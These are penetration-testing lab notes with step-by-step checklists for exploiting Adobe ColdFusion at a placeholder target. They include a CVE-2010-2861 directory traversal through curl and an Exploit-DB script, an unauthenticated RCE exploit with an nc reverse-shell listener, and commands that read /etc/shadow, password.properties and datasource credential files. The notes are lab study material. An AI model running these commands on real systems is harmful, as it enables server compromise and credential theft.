# ColdFusion Labs

> Cross-reference: [[coldfusion-methodology]]

---

## Lab 1: Directory Traversal — Read password.properties

### Steps

- [ ] Confirm ColdFusion at `http://TARGET:8500`
- [ ] Exploit CVE-2010-2861:
```bash
# Using searchsploit
searchsploit -p 14641
python2 14641.py TARGET 8500 /CFIDE/administrator/enter.cfm "../../../../../../../lib/password.properties%00en"
```
- [ ] Alternative — direct curl:
```bash
curl -s "http://TARGET:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
```
- [ ] Extract admin password hash from output
- [ ] Crack hash or use directly to login at `/CFIDE/administrator/`

---

## Lab 2: Unauthenticated RCE

### Steps

- [ ] Identify ColdFusion version
- [ ] Find applicable exploit:
```bash
searchsploit coldfusion
searchsploit -p 50057
```
- [ ] Modify exploit script — update `execute_payload()` with target details
- [ ] Start listener: `nc -nlvp 4443`
- [ ] Run exploit:
```bash
python3 50057.py http://TARGET:8500
```
- [ ] Catch shell → verify access
- [ ] Post-exploitation:
```bash
# Read datasource credentials
cat /opt/coldfusion/lib/neo-query.xml
cat /opt/coldfusion/lib/neo-datasource.xml
# Check if running as root/SYSTEM
whoami
```

---

## Lab 3: File Read → Credential Harvesting

- [ ] Use directory traversal to read sensitive files:
```bash
# Linux
curl "http://TARGET:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../etc/passwd%00en"
curl "http://TARGET:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../etc/shadow%00en"

# Datasource creds
curl "http://TARGET:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/neo-query.xml%00en"
```
- [ ] Use DB creds to connect: `mysql -u USER -p -h TARGET`
- [ ] Look for user credentials in database
